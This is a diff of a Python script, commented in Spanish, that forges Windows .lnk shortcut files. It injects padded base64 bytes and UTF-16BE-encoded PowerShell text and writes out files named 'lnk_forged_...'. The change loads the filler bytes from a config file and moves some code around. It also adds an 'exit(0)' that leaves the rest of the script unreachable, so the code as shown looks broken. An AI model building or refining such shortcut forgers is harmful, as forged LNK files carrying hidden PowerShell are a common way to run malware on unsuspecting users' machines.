@@ -1,13 +1,19 @@
 import base64
 import time
-
-# Se obtiene la fecha y se da nombre al lnk si es que se guarda con el año el dia y minuto
-date_ = time.localtime()
-name_file_save = f"lnk_forged_{date_[0]}-{date_[2]}-{date_[4]}.lnk"
+import json
 
 # Varaible que contiene los bytes a ocupar dentro del lnk 45 son las veces que se repite la cadena A9AD0APQ en el
-# base64 original
-b64_extra_bytes = "ACAAIgAg"+"AD0APQA9"*45+"AD0APQAgACI"
+# base64 original, se genera de forma dinamica con la seccion de importar LNK propio
+try:
+    with open(".cfg_lnk", "r", encoding="utf-8") as read_json:
+        
+        all_json = json.loads(read_json.read())
+        b64_extra_bytes = all_json["bytes_prev"] + all_json["target_"]*all_json["count_target"] + all_json["bytes_next"]
+
+except:
+    b64_extra_bytes = "ACAAIgAg"+"AD0APQA9"*45+"AD0APQAgACI"
+
+exit(0)
 
 # Varibale que limita el relleno de bytes
 max_bytes = len(b64_extra_bytes)
@@ -148,6 +154,10 @@ while True:
     except Exception as err:
         print(f"[ERROR] {err}")
 
+# Se obtiene la fecha y se da nombre al lnk si es que se guarda con el año el dia y minuto
+date_ = time.localtime()
+name_file_save = f"lnk_forged_{date_[0]}-{date_[2]}-{date_[4]}.lnk"
+
 # Se codifica el texto en UTF-16BE formato usado en powershell, para luego codificarlo a b64
 # y transformarlo a str con .decode ( porque es binario )
 code_ = check_len_or_save(buffer_, False)
@@ -169,7 +179,6 @@ with open("modular_lnk.b64", "r", encoding="utf-8") as read_ps_b64, open(name_fi
         ---------------------
 :: Tamaño en txt original: {len(all_b64)}
 :: Resto original: {rest_}
-
 -------------------------------------------""")
         if rest_ == 2:
             all_b64 = all_b64+"=="
@@ -189,7 +198,7 @@ with open("modular_lnk.b64", "r", encoding="utf-8") as read_ps_b64, open(name_fi
 :: Tamaño en txt ajustado: {len(all_b64)}
 :: Resto resultante: {len(all_b64) % 4}
 -------------------------------------------
-[INFO] LNK guardado como {name_file_save}...
+[INFO] LNK guardado como {name_file_save} =>> [OK]
     """)
         
     except Exception as err:
